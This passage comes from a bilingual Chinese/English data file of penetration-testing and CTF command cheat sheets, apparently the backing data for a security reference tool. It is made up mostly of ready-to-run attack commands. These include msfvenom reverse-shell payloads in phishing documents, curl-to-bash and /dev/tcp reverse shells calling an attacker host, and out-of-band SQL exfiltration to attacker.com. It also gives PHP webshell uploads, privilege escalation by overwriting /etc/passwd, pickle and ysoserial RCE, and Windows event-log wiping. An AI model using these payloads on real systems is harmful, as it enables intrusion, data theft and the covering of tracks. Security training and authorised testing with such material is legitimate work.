      { name: { zh: 'SSL Pinning 绕过', en: 'SSL pinning bypass' }, command: '# 方法1: Frida\nfrida -U -f com.target.app -l universal-ssl-bypass.js\n# 方法2: Objection\nobjection -g com.target.app explore\nios sslpinning disable  # iOS\nandroid sslpinning disable  # Android\n# 方法3: apk-mitm\napk-mitm app.apk', description: { zh: 'SSL 证书固定绕过方法', en: 'SSL certificate pinning bypass methods' }, platform: 'all' },
      { name: { zh: 'Burp 拦截移动流量', en: 'Burp intercept mobile traffic' }, command: '# Android\nadb shell settings put global http_proxy burp_ip:8080\n# iOS\n# 设置 -> 无线局域网 -> HTTP代理 -> 手动\n# 导入 Burp CA 证书\ncurl http://burp/cert -o burp.der\nadb push burp.der /sdcard/burp.der', description: { zh: '配置 Burp 拦截移动端流量', en: 'Configure Burp to intercept mobile traffic' }, platform: 'all' }
    ],
    references: ['https://github.com/MobSF/Mobile-Security-Framework-MobSF']
  },
  {
    id: 'linux-privesc-gtfobins',
    name: { zh: 'GTFOBins 速查', en: 'GTFOBins Quick Reference' },
    description: { zh: 'Linux SUID/Sudo 提权常用二进制速查', en: 'Quick reference for Linux SUID/Sudo privilege escalation binaries' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: 'find SUID 提权', en: 'find SUID escalation' }, command: 'find . -exec /bin/sh -p \\;\n# 或\nfind / -name flag.txt -exec cat {} \\;', description: { zh: 'find 二进制 SUID 提权', en: 'Privilege escalation via find binary' }, platform: 'linux' },
      { name: { zh: 'vim/nano 提权', en: 'vim/nano escalation' }, command: '# vim SUID\nvim -c ":python3 import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"\nvim -c ":!bash -p"\n# sudo vim\nsudo vim -c ":!bash"', description: { zh: 'vim 编辑器提权', en: 'Privilege escalation via vim' }, platform: 'linux' },
      { name: { zh: 'python/perl/ruby 提权', en: 'Script interpreter escalation' }, command: '# python sudo 提权\nsudo python3 -c "import os; os.system(\'/bin/bash\')"\n# perl\nsudo perl -e "exec \'/bin/bash\'"\n# ruby\nsudo ruby -e "exec \'/bin/bash\'"', description: { zh: '脚本解释器提权', en: 'Script interpreter privilege escalation' }, platform: 'linux' },
      { name: { zh: 'cp/mv 写入', en: 'cp/mv write escalation' }, command: '# 覆盖 /etc/passwd\ncP /tmp/fakepwd /etc/passwd\n# 写入 crontab\ncp /tmp/cron /etc/cron.d/evil', description: { zh: 'cp/mv SUID 文件写入提权', en: 'File write escalation via cp/mv SUID' }, platform: 'linux' },
      { name: { zh: 'less/more 提权', en: 'less/more escalation' }, command: '# 在 pager 中\n!bash\n!/bin/sh', description: { zh: 'less/more SUID Shell 逃逸', en: 'Shell escape via less/more SUID' }, platform: 'linux' }
    ],
    references: ['https://gtfobins.github.io/']
  },
  {
    id: 'ctf-cryptography',
    name: { zh: 'CTF 密码学速查', en: 'CTF Cryptography Quick Reference' },
    description: { zh: 'CTF 密码学题目常见考点和解题思路', en: 'Common CTF cryptography challenge topics and solving approaches' },
    category: { zh: 'CTF/密码学', en: 'CTF / Cryptography' },
    commands: [
      { name: { zh: 'RSA 分析流程', en: 'RSA analysis workflow' }, command: '# 1. 检查 e 是否过小 (e=3 → cube root)\n# 2. 用 factordb/yafu 分解 n\n# 3. 检查 p/q 接近 → Fermat 分解\n# 4. 多个公钥共享 p → GCD 攻击\n# 5. 一键尝试: RsaCtfTool.py --publickey pub.pem --uncipherfile cipher', description: { zh: 'RSA 题目攻击思路流程', en: 'RSA challenge attack thought process' }, platform: 'all' },
      { name: { zh: 'AES 攻击', en: 'AES attacks' }, command: '# ECB 企鹅攻击: 相同明文 = 相同密文\n# CBC 翻转: 修改密文块改变下一块\n# CTR 流密码: XOR 求解\n# Padding Oracle\npython3 padbuster.py http://target/ ENCRYPTED_VALUE 8 -encoding 0', description: { zh: 'AES 不同模式攻击方法', en: 'AES different mode attack methods' }, platform: 'all' },
      { name: { zh: '经典密码识别', en: 'Classical cipher identification' }, command: '# 凯撒密码: 字母位移\n# 维吉尼亚: 密钥重复 XOR\n# Base64: 末尾=\n# 摩斯码: .-/-. 格式\n# 培根密码: AABB 二字母组合\n# 栅栏密码: 交替取字符\n# ROT13: 字母移13位', description: { zh: '经典密码类型识别', en: 'Classical cipher type identification' }, platform: 'all' },
      { name: { zh: 'CyberChef 常用操作', en: 'CyberChef common operations' }, command: '# https://gchq.github.io/CyberChef/\n# 常用 Recipe:\nFrom Base64 -> Gunzip -> From Hex\nMagic (自动识别)\nDecode Text (多种编码)\nXOR Brute Force', description: { zh: 'CyberChef 在线工具操作', en: 'CyberChef online tool operations' }, platform: 'all' }
    ],
    references: ['https://gchq.github.io/CyberChef/', 'https://cryptohack.org/']
  },
  {
    id: 'red-team-operations',
    name: { zh: '红队行动速查', en: 'Red Team Operations Quick Reference' },
    description: { zh: '红队行动关键阶段命令速查', en: 'Key phase command reference for red team operations' },
    category: { zh: '红队工具', en: 'Red Team Tools' },
    commands: [
      { name: { zh: '初始访问', en: 'Initial access' }, command: '# 钓鱼邮件附件\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=ip LPORT=443 -f docm -o evil.docm\n# 宏木马\n# HTA 文件\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=443 -f hta-psh -o evil.hta', description: { zh: '红队初始访问方法', en: 'Red team initial access methods' }, platform: 'all' },
      { name: { zh: 'C2 通信', en: 'C2 communications' }, command: '# HTTPS C2\n./teamserver ip password malleable_profile\n# DNS C2 (隐蔽性高)\n# 使用 Cobalt Strike / Sliver / Havoc\n# 建立信标通信', description: { zh: 'C2 框架建立通信', en: 'Establish C2 framework communications' }, platform: 'linux' },
      { name: { zh: '横向移动', en: 'Lateral movement' }, command: '# 黄金规则: 最小权限，减少噪音\n# Pass-the-Hash\npsexec.py -hashes :NTLM domain/user@target\n# WMI\nwmiexec.py domain/user:pass@target\n# WinRM\nevil-winrm -i target -u user -p pass', description: { zh: '红队横向移动技术', en: 'Red team lateral movement techniques' }, platform: 'all' },
      { name: { zh: '目标清理', en: 'Cleanup operations' }, command: '# 清除日志\nclearev  # Meterpreter\nwevtutil cl System; wevtutil cl Security; wevtutil cl Application\n# 删除工具\ndel /f /q C:\\temp\\*.exe\n# 恢复修改', description: { zh: '红队行动后清理痕迹', en: 'Red team post-operation cleanup' }, platform: 'all' }
    ],
    references: ['https://redteam.guide/']
  },


  {
    id: 'web-security-headers',
    name: { zh: 'HTTP 安全响应头测试', en: 'HTTP Security Headers Testing' },
    description: { zh: 'HTTP 安全响应头检测和利用命令', en: 'HTTP security response header detection and exploitation commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: '安全头检测', en: 'Security header check' }, command: "curl -I https://target.com | grep -iE 'X-Frame-Options|Content-Security-Policy|X-XSS-Protection|Strict-Transport-Security|X-Content-Type-Options|Referrer-Policy|Permissions-Policy'\n# shcheck 工具\nshcheck https://target.com", description: { zh: '检测 HTTP 安全响应头', en: 'Check HTTP security response headers' }, platform: 'all' },
      { name: { zh: 'HSTS 检测', en: 'HSTS detection' }, command: "curl -I https://target.com | grep -i 'Strict-Transport-Security'\n# 检测 HSTS 预加载\ncurl 'https://hstspreload.org/api/v2/status?domain=target.com'", description: { zh: 'HSTS 配置检测', en: 'HSTS configuration detection' }, platform: 'all' },
      { name: { zh: 'CSP 分析', en: 'CSP analysis' }, command: "curl -I https://target.com | grep -i 'Content-Security-Policy'\n# CSP Evaluator\n# https://csp-evaluator.withgoogle.com/\n# 检测 unsafe-inline unsafe-eval", description: { zh: 'CSP 内容安全策略分析', en: 'Content Security Policy analysis' }, platform: 'all' }
    ],
    references: ['https://securityheaders.com/']
  },
  {
    id: 'privilege-escalation-tools',
    name: { zh: '提权辅助工具集', en: 'Privilege Escalation Helper Toolkit' },
    description: { zh: '提权检测和利用自动化工具命令', en: 'Privilege escalation detection and exploitation tool commands' },
    category: { zh: '权限提升', en: 'Privilege Escalation' },
    commands: [
      { name: { zh: 'PEASS 工具集', en: 'PEASS toolkit' }, command: '# LinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# WinPEAS\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.exe -o winpeas.exe', description: { zh: '下载执行 PEASS 提权脚本', en: 'Download and run PEASS escalation scripts' }, platform: 'all' },
      { name: { zh: 'BeRoot', en: 'BeRoot check' }, command: 'python beRoot.py\n# 自动检查所有常见提权向量\n# 支持 Linux/Windows/macOS', description: { zh: 'BeRoot 自动提权检测', en: 'BeRoot automatic privilege escalation detection' }, platform: 'all' },
      { name: { zh: 'PowerUp Windows', en: 'PowerUp Windows escalation' }, command: 'IEX(New-Object Net.WebClient).DownloadString("http://attacker/PowerUp.ps1")\nInvoke-AllChecks\n# 自动检查并利用\nInvoke-AllChecks | Out-File -Encoding ASCII checks.txt', description: { zh: 'PowerUp 自动 Windows 提权', en: 'PowerUp automatic Windows privilege escalation' }, platform: 'windows' },
      { name: { zh: 'Sudo 版本漏洞', en: 'Sudo version exploits' }, command: 'sudo --version\n# CVE-2021-3156 (sudo < 1.9.5p2)\n# CVE-2019-14287 (sudo < 1.8.28): sudo -u#-1 /bin/bash', description: { zh: 'Sudo 版本漏洞检测', en: 'Check for sudo version vulnerabilities' }, platform: 'linux' }
    ],
    references: ['https://github.com/carlospolop/PEASS-ng']
  },
  {
    id: 'sql-injection-advanced',
    name: { zh: 'SQL 注入高级技术', en: 'Advanced SQL Injection Techniques' },
    description: { zh: 'SQL 注入进阶技术：带外、二次注入、存储过程', en: 'Advanced SQL injection: OOB, second-order, stored procedures' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'OOB DNS 外带', en: 'OOB DNS exfiltration' }, command: "# MySQL LOAD DATA INFILE\nSELECT LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\share\\\\a'))\n# MSSQL\nEXEC master..xp_dirtree '\\\\attacker.com\\share\\'\n# Oracle\nSELECT UTL_HTTP.REQUEST('http://attacker.com/'||user) FROM dual", description: { zh: 'SQL 注入带外数据提取', en: 'SQL injection OOB data exfiltration' }, platform: 'all' },
      { name: { zh: '二次注入', en: 'Second-order injection' }, command: "# 第一步: 注入恶意数据\nusername = admin'-- \n# 第二步: 触发查询\n# 当数据从数据库读取后再次用于查询时触发", description: { zh: '二次 SQL 注入原理', en: 'Second-order SQL injection principle' }, platform: 'all' },
      { name: { zh: 'JSON 注入', en: 'JSON SQL injection' }, command: "# MySQL JSON 列\nSELECT * FROM users WHERE data->>'$.role'='admin'\n# 注入\ncurl target.com/api -d '{\"role\":\"admin\\' OR 1=1--\"}'\n# 空字节\ncurl target.com/?id=1%00'+OR+'1'='1", description: { zh: 'JSON 格式 SQL 注入', en: 'SQL injection via JSON fields' }, platform: 'all' },
      { name: { zh: 'MSSQL xp_cmdshell', en: 'MSSQL xp_cmdshell RCE' }, command: "-- 启用\nEXEC sp_configure 'show advanced options',1;\nRECONFIGURE;\nEXEC sp_configure 'xp_cmdshell',1;\nRECONFIGURE;\n-- 执行\nEXEC xp_cmdshell 'whoami';", description: { zh: 'MSSQL xp_cmdshell RCE', en: 'MSSQL xp_cmdshell for RCE' }, platform: 'all' }
    ],
    references: ['https://portswigger.net/web-security/sql-injection']
  },
  {
    id: 'pentest-reporting',
    name: { zh: '渗透测试报告工具', en: 'Pentest Reporting Tools' },
    description: { zh: '渗透测试报告生成和管理工具', en: 'Penetration testing report generation and management tools' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'Dradis 协作平台', en: 'Dradis collaboration platform' }, command: 'docker pull dradis/dradis\ndocker run -p 3000:3000 dradis/dradis\n# 访问 http://localhost:3000', description: { zh: 'Dradis 渗透测试协作平台', en: 'Dradis penetration testing collaboration platform' }, platform: 'all' },
      { name: { zh: 'PlexTrac 报告', en: 'PlexTrac report' }, command: '# 云端平台 https://plextrac.com\n# 导入 Nessus/Burp/Nmap 扫描结果\n# 生成专业报告', description: { zh: 'PlexTrac 报告管理平台', en: 'PlexTrac report management platform' }, platform: 'all' },
      { name: { zh: 'pwndoc 报告', en: 'pwndoc report generator' }, command: 'docker-compose up -d\n# 访问 https://localhost:8443\n# 自托管报告生成平台', description: { zh: 'pwndoc 自托管报告生成', en: 'pwndoc self-hosted report generation' }, platform: 'linux' },
      { name: { zh: 'MarkDown 报告模板', en: 'Markdown report template' }, command: '# 漏洞格式\n## [HIGH] SQL Injection in /api/search\n**CVSS:** 9.8\n**URL:** https://target.com/api/search?q=\n**Payload:** \' OR 1=1--\n**Impact:** 数据库完全泄露\n**Evidence:** [截图]\n**Remediation:** 使用参数化查询', description: { zh: '漏洞报告标准格式', en: 'Standard vulnerability report format' }, platform: 'all' }
    ],
    references: ['https://github.com/pwndoc/pwndoc']
  },


  {
    id: 'web-cache-tools',
    name: { zh: 'Web 缓存和 CDN 安全', en: 'Web Cache and CDN Security' },
    description: { zh: 'Web 缓存投毒和 CDN 绕过测试命令', en: 'Web cache poisoning and CDN bypass testing commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'CDN 真实 IP 发现', en: 'CDN real IP discovery' }, command: 'nslookup target.com\n# SecurityTrails 历史 DNS\ncurl "https://api.securitytrails.com/v1/history/target.com/dns/a" -H "apikey: KEY"\n# Shodan\nshodan search "ssl.cert.subject.cn:target.com" --fields ip_str\n# 子域名可能不在 CDN\nnslookup direct.target.com', description: { zh: '绕过 CDN 发现真实 IP', en: 'Bypass CDN to discover real IP' }, platform: 'all' },
      { name: { zh: 'Web 缓存探测', en: 'Cache probing' }, command: "curl -I https://target.com -H 'X-Forwarded-Host: evil.com'\ncurl -I https://target.com -H 'X-Cache-Test: 1'\n# 观察 Age/X-Cache/Cache-Control 响应头", description: { zh: '探测 Web 缓存行为', en: 'Probe web cache behavior' }, platform: 'all' },
      { name: { zh: '缓存键操纵', en: 'Cache key manipulation' }, command: "# 测试 Fat GET\ncurl -X GET 'https://target.com/' -d 'key=evil'\n# 测试未键控头\ncurl -H 'X-Original-URL: /admin' https://target.com/\ncurl -H 'X-Rewrite-URL: /admin' https://target.com/", description: { zh: '操纵缓存键进行投毒', en: 'Manipulate cache keys for poisoning' }, platform: 'all' }
    ],
    references: ['https://portswigger.net/research/practical-web-cache-poisoning']
  },
  {
    id: 'file-upload-attacks',
    name: { zh: '文件上传攻击技术', en: 'File Upload Attack Techniques' },
    description: { zh: '文件上传绕过和 WebShell 上传攻击', en: 'File upload bypass and WebShell upload attacks' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: '扩展名绕过', en: 'Extension bypass' }, command: "# 双扩展名\nevil.php.jpg\nevil.php%00.jpg\nevil.pHp\nevil.php7\nevil.phtml\nevil.shtml\nevil.php.xxxxx", description: { zh: '文件扩展名过滤绕过', en: 'File extension filter bypass' }, platform: 'all' },
      { name: { zh: 'Content-Type 绕过', en: 'Content-Type bypass' }, command: "# 修改 Content-Type\nContent-Type: image/jpeg\n# 配合 Burp 修改请求\n# 文件头伪造\nprintf '\\xff\\xd8\\xff<?php system($_GET[cmd]); ?>' > evil.jpg", description: { zh: 'MIME 类型检测绕过', en: 'MIME type check bypass' }, platform: 'all' },
      { name: { zh: '.htaccess 上传', en: '.htaccess upload' }, command: "# 上传 .htaccess\nAddType application/x-httpd-php .jpg\n# 然后上传 evil.jpg (实为PHP)\ncurl 'http://target/upload/evil.jpg?cmd=id'", description: { zh: '上传 .htaccess 绕过限制', en: 'Bypass restrictions via .htaccess upload' }, platform: 'all' },
      { name: { zh: '路径遍历上传', en: 'Path traversal upload' }, command: "# 文件名包含路径遍历\ncurl -F 'file=@shell.php;filename=../../shell.php' http://target/upload\n# 或通过 Burp 修改 filename\nfilename=\"../../../var/www/html/shell.php\"", description: { zh: '通过路径遍历写入目标目录', en: 'Write to target directory via path traversal' }, platform: 'all' }
    ],
    references: ['https://book.hacktricks.xyz/pentesting-web/file-upload']
  },
  {
    id: 'database-pentest-tools',
    name: { zh: '数据库渗透工具集', en: 'Database Penetration Toolkit' },
    description: { zh: '各类数据库渗透测试命令速查', en: 'Quick reference for various database penetration testing commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'PostgreSQL 利用', en: 'PostgreSQL exploitation' }, command: "# 连接\npsql -h target -U postgres\n# 版本和用户\nSELECT version(); SELECT user;\n# 列出数据库\n\\l\n# RCE (superuser)\nCREATE TABLE cmd_exec(cmd_output text);\nCOPY cmd_exec FROM PROGRAM 'id';\nSELECT * FROM cmd_exec;", description: { zh: 'PostgreSQL 渗透测试', en: 'PostgreSQL penetration testing' }, platform: 'all' },
      { name: { zh: 'MongoDB 利用', en: 'MongoDB exploitation' }, command: "# 连接\nmongosh mongodb://target:27017\n# 无认证枚举\nmongo --host target --eval 'db.adminCommand({listDatabases:1})'\n# 注入测试\ncurl 'http://target/api?user[$ne]=admin'", description: { zh: 'MongoDB 渗透测试', en: 'MongoDB penetration testing' }, platform: 'all' },
      { name: { zh: 'Oracle 利用', en: 'Oracle exploitation' }, command: "sqlplus user/pass@target:1521/ORCL\n-- 枚举\nSELECT * FROM all_tables;\nSELECT * FROM dba_users;\n-- Java 执行命令\nEXEC dbms_java.grant_permission('SCOTT','java.lang.RuntimePermission','*','');\nCREATE PROCEDURE exec_cmd(cmd VARCHAR2) AS ...", description: { zh: 'Oracle 数据库渗透测试', en: 'Oracle database penetration testing' }, platform: 'all' }
    ],
    references: ['https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql']
  },
  {
    id: 'active-directory-tools',
    name: { zh: 'Active Directory 工具集', en: 'Active Directory Toolkit' },
    description: { zh: 'AD 域渗透完整工具集速查', en: 'Comprehensive AD domain penetration toolkit reference' },
    category: { zh: '域渗透', en: 'Domain Penetration' },
    commands: [
      { name: { zh: 'ADExplorer', en: 'ADExplorer' }, command: '# Sysinternals AD Explorer\nadexplorer.exe\n# 连接域控\n# 浏览 AD 对象树\n# 创建快照对比', description: { zh: 'ADExplorer 图形化 AD 浏览', en: 'ADExplorer graphical AD browser' }, platform: 'windows' },
      { name: { zh: 'LDAPDomainDump', en: 'LDAPDomainDump' }, command: 'ldapdomaindump domain/user:password@dc_ip\nopen domain_*.html  # 查看报告\n# 生成 HTML 报告含用户/组/计算机/GPO', description: { zh: 'LDAP 数据转储为可视报告', en: 'Dump LDAP data to visual HTML reports' }, platform: 'linux' },
      { name: { zh: 'ADRecon', en: 'ADRecon' }, command: "powershell -exec bypass\nImport-Module ADRecon.ps1\nInvoke-ADRecon  # 生成完整 AD 报告", description: { zh: 'ADRecon AD 信息全面收集', en: 'Comprehensive AD info collection with ADRecon' }, platform: 'windows' },
      { name: { zh: 'PingCastle', en: 'PingCastle audit' }, command: 'PingCastle.exe --healthcheck --server dc.domain.com\nPingCastle.exe --level Full\n# 生成 HTML 健康度报告', description: { zh: 'PingCastle AD 安全审计', en: 'PingCastle Active Directory security audit' }, platform: 'windows' }
    ],
    references: ['https://github.com/lkarlslund/Adalanche']
  },


  {
    id: 'linux-commands-advanced',
    name: { zh: 'Linux 高级命令技巧', en: 'Linux Advanced Command Tricks' },
    description: { zh: 'Linux 渗透测试和 CTF 常用高级命令', en: 'Advanced Linux commands for penetration testing and CTF' },
    category: { zh: '系统命令', en: 'System Commands' },
    commands: [
      { name: { zh: 'Bash 重定向技巧', en: 'Bash redirection tricks' }, command: '# 无文件执行\ncurl http://attacker/script.sh | bash\nbash <(curl -s http://attacker/script.sh)\n# 内存执行\nexec 3<>/dev/tcp/attacker/4444; bash <&3 >&3 2>&3', description: { zh: 'Bash 重定向高级技巧', en: 'Advanced Bash redirection techniques' }, platform: 'linux' },
      { name: { zh: 'find 高级用法', en: 'find advanced usage' }, command: "find / -perm -u=s -type f 2>/dev/null  # SUID\nfind / -writable -type f 2>/dev/null  # 可写文件\nfind / -name '*.sh' -mmin -60 2>/dev/null  # 最近1小时修改\nfind / -user root -perm -4000 2>/dev/null", description: { zh: 'find 命令安全审计用法', en: 'find command for security auditing' }, platform: 'linux' },
      { name: { zh: 'awk/sed 数据处理', en: 'awk/sed data processing' }, command: "# 提取 IP\nawk '{print $1}' access.log | sort | uniq -c | sort -nr\n# 提取密码\ngrep -oP '(?<=password=)[^&]+' log.txt\n# Base64 编解码\necho 'data' | base64\necho 'ZGF0YQ==' | base64 -d", description: { zh: '文本处理和数据提取', en: 'Text processing and data extraction' }, platform: 'linux' },
      { name: { zh: 'netstat 替代', en: 'netstat alternatives' }, command: "ss -tlnp  # 监听 TCP\nss -tunlp  # 所有监听\ncat /proc/net/tcp  # 直接读取\nls -la /proc/*/fd | grep socket  # 通过 /proc", description: { zh: '无 netstat 的网络连接查看', en: 'View network connections without netstat' }, platform: 'linux' },
      { name: { zh: '环境变量利用', en: 'Environment variable exploitation' }, command: "export PATH=/tmp:$PATH\nexport LD_PRELOAD=/tmp/evil.so\nexport PYTHONPATH=/tmp/\n# GTFOBins PATH hijacking\ncd /tmp && echo 'bash -p' > id && chmod +x id\nexport PATH=/tmp:$PATH && sudo id", description: { zh: '环境变量提权利用', en: 'Environment variable privilege escalation' }, platform: 'linux' }
    ],
    references: ['https://gtfobins.github.io/']
  },
  {
    id: 'web-deserialization',
    name: { zh: '反序列化攻击工具', en: 'Deserialization Attack Tools' },
    description: { zh: '各平台反序列化漏洞利用工具', en: 'Deserialization vulnerability exploitation tools for various platforms' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'ysoserial Java', en: 'ysoserial Java' }, command: 'java -jar ysoserial.jar CommonsCollections1 "id"\njava -jar ysoserial.jar CommonsCollections6 "curl http://attacker"\njava -jar ysoserial.jar Spring1 "whoami" | base64 -w 0', description: { zh: 'Java 反序列化 Gadget Chain 生成', en: 'Generate Java deserialization gadget chains' }, platform: 'all' },
      { name: { zh: 'PHPGGC PHP', en: 'PHPGGC PHP' }, command: 'phpggc -l\nphpggc Laravel/RCE1 system "id"\nphpggc -b Slim/RCE1 exec whoami  # base64 输出', description: { zh: 'PHP 反序列化 Gadget Chain 生成', en: 'Generate PHP deserialization gadget chains' }, platform: 'all' },
      { name: { zh: 'Pickle Python RCE', en: 'Python pickle RCE' }, command: "import pickle, os\nclass RCE:\n    def __reduce__(self):\n        return (os.system, ('id',))\npayload = pickle.dumps(RCE())\n# 发送 payload 到目标", description: { zh: 'Python pickle 反序列化 RCE', en: 'Python pickle deserialization RCE' }, platform: 'all' },
      { name: { zh: '.NET ViewState', en: '.NET ViewState attack' }, command: 'ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "id" --decryptionalg="AES" --decryptionkey="KEY" --validationalg="SHA1" --validationkey="KEY" --path="/app/login.aspx"', description: { zh: '.NET ViewState 反序列化攻击', en: '.NET ViewState deserialization attack' }, platform: 'windows' }
    ],
    references: ['https://github.com/frohoff/ysoserial', 'https://github.com/ambionics/phpggc']
  },
  {
    id: 'proxy-tools',
    name: { zh: '代理工具速查', en: 'Proxy Tools Quick Reference' },
    description: { zh: '渗透测试常用代理工具配置命令', en: 'Common proxy tool configuration commands for penetration testing' },
    category: { zh: '信息收集', en: 'Information Gathering' },
    commands: [
      { name: { zh: 'Burp Suite 代理', en: 'Burp Suite proxy' }, command: '# 监听 127.0.0.1:8080\ncurl --proxy http://127.0.0.1:8080 https://target.com\n# 证书安装\ncurl http://localhost:8080/cert -o burp.der\nopenssl x509 -in burp.der -inform DER -out burp.pem', description: { zh: 'Burp Suite 代理配置', en: 'Burp Suite proxy configuration' }, platform: 'all' },
      { name: { zh: 'mitmproxy', en: 'mitmproxy' }, command: 'mitmproxy -p 8080\nmitmweb -p 8080  # Web 界面\nmitmdump -p 8080 -w output.pcap  # 保存流量', description: { zh: 'mitmproxy 命令行代理', en: 'mitmproxy command-line proxy' }, platform: 'all' },
      { name: { zh: 'ProxyChains 配置', en: 'ProxyChains config' }, command: 'cat /etc/proxychains4.conf\n# 添加代理\nsocks5 127.0.0.1 1080\n# 使用\nproxychains4 curl http://internal.target\nproxychains4 ssh user@target', description: { zh: 'ProxyChains 代理链配置', en: 'ProxyChains proxy chain configuration' }, platform: 'linux' }
    ],
    references: ['https://mitmproxy.org/']
  },


  {
    id: 'api-security-tools',
    name: { zh: 'API 安全测试工具', en: 'API Security Testing Tools' },
    description: { zh: 'REST/GraphQL/gRPC API 安全测试工具命令', en: 'REST/GraphQL/gRPC API security testing tool commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'Postman 安全测试', en: 'Postman security testing' }, command: '# Postman 安全测试要点:\n# 1. 修改 JWT: 删除签名/换 none 算法\n# 2. 越权: 用A的token访问B的资源\n# 3. 批量赋值: 添加未公开字段\n# 4. 枚举: 遍历 ID\n# 5. 速率限制: 短时间大量请求', description: { zh: 'Postman API 安全测试要点', en: 'Key Postman API security testing points' }, platform: 'all' },
      { name: { zh: 'kiterunner API 模糊', en: 'kiterunner API fuzzing' }, command: 'kr scan https://target.com -w routes-large.kite\nkr brute https://target.com -w wordlist.txt', description: { zh: 'kiterunner API 路由发现', en: 'kiterunner API route discovery' }, platform: 'all' },
      { name: { zh: 'Swagger 枚举', en: 'Swagger/OpenAPI enumeration' }, command: "# 常见 Swagger 路径\ncurl https://target.com/api-docs\ncurl https://target.com/swagger.json\ncurl https://target.com/openapi.yaml\n# swagger2postman\nnpx swagger-jsdoc -o swagger.json", description: { zh: 'Swagger/OpenAPI 文档发现', en: 'Swagger/OpenAPI documentation discovery' }, platform: 'all' },
      { name: { zh: 'GraphQL 注入', en: 'GraphQL injection' }, command: "# Introspection\ncurl -X POST target/graphql -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name}}}\"}'  \n# 字段建议注入\n'{user{username password admin}}\n# 批量查询\n'{users{id username email}}'", description: { zh: 'GraphQL 漏洞测试', en: 'GraphQL vulnerability testing' }, platform: 'all' }
    ],
    references: ['https://owasp.org/www-project-api-security/']
  },
  {
    id: 'internal-recon',
    name: { zh: '内网侦察命令集', en: 'Internal Network Reconnaissance Commands' },
    description: { zh: '内网环境快速侦察和资产发现命令', en: 'Quick internal network reconnaissance and asset discovery commands' },
    category: { zh: '内网渗透', en: 'Intranet Penetration' },
    commands: [
      { name: { zh: 'Linux 内网扫描', en: 'Linux internal scan' }, command: "# 存活主机 (无 nmap)\nfor i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo 192.168.1.$i up; done\n# 端口探测\nfor p in 22 80 443 3306 8080; do (echo > /dev/tcp/192.168.1.5/$p) 2>/dev/null && echo $p open; done\n# nc 扫描\nnc -zv 192.168.1.5 1-1024 2>&1 | grep open", description: { zh: 'Linux 内网快速侦察', en: 'Quick internal network recon on Linux' }, platform: 'linux' },
      { name: { zh: 'Windows 内网扫描', en: 'Windows internal scan' }, command: 'for /l %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "TTL" && echo 192.168.1.%i\n# PowerShell\n1..254 | % {if((New-Object Net.Sockets.TcpClient).Connect("192.168.1.$_",80)){echo "192.168.1.$_"}}', description: { zh: 'Windows 内网快速扫描', en: 'Quick internal scan on Windows' }, platform: 'windows' },
      { name: { zh: '域控发现', en: 'Domain controller discovery' }, command: 'nslookup -type=srv _ldap._tcp.dc._msdcs.domain.com\nnltest /dclist:domain.com\nnet group "Domain Controllers" /domain', description: { zh: '发现域控制器', en: 'Discover domain controllers' }, platform: 'windows' },
      { name: { zh: '服务发现', en: 'Service discovery' }, command: 'nmap -sV -p 22,80,443,139,445,3389,1433,3306,5432,6379,27017 192.168.1.0/24 --open\nnetdiscover -r 192.168.1.0/24', description: { zh: '内网服务快速发现', en: 'Quick internal service discovery' }, platform: 'linux' }
    ],
    references: ['https://book.hacktricks.xyz/generic-methodologies-and-resources/pentesting-network']
  },
  {
    id: 'ssrf-exploitation',
    name: { zh: 'SSRF 利用技术', en: 'SSRF Exploitation Techniques' },
    description: { zh: 'SSRF 服务端请求伪造漏洞利用命令', en: 'SSRF server-side request forgery exploitation commands' },
    category: { zh: 'Web渗透', en: 'Web Penetration' },
    commands: [
      { name: { zh: 'SSRF 基础探测', en: 'Basic SSRF probe' }, command: "curl 'http://target/fetch?url=http://localhost/'\ncurl 'http://target/fetch?url=http://127.0.0.1:22'\ncurl 'http://target/fetch?url=http://[::1]:80'\n# 使用 Collaborator\ncurl 'http://target/fetch?url=http://YOUR_COLLAB.oast.pro'", description: { zh: 'SSRF 基础探测 Payload', en: 'Basic SSRF probe payloads' }, platform: 'all' },
      { name: { zh: 'SSRF 绕过', en: 'SSRF bypass' }, command: "# IP 变体\nhttp://2130706433/  # 127.0.0.1 十进制\nhttp://0x7f000001/  # 十六进制\nhttp://0177.0.0.1/  # 八进制\n# 域名重定向\nhttp://127.0.0.1.xip.io/\n# 短链接\nhttp://spoofed.burpcollaborator.net@evil.com/", description: { zh: 'SSRF IP 过滤绕过', en: 'SSRF IP filter bypass techniques' }, platform: 'all' },
      { name: { zh: 'Gopher SSRF 攻击', en: 'Gopher SSRF attack' }, command: "# 攻击 Redis\ngopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A\n# 攻击 MySQL\n# 使用 Gopherus 工具\npython2 gopherus.py --exploit mysql --qtype user", description: { zh: 'Gopher 协议 SSRF 攻击', en: 'Gopher protocol SSRF attacks' }, platform: 'all' },
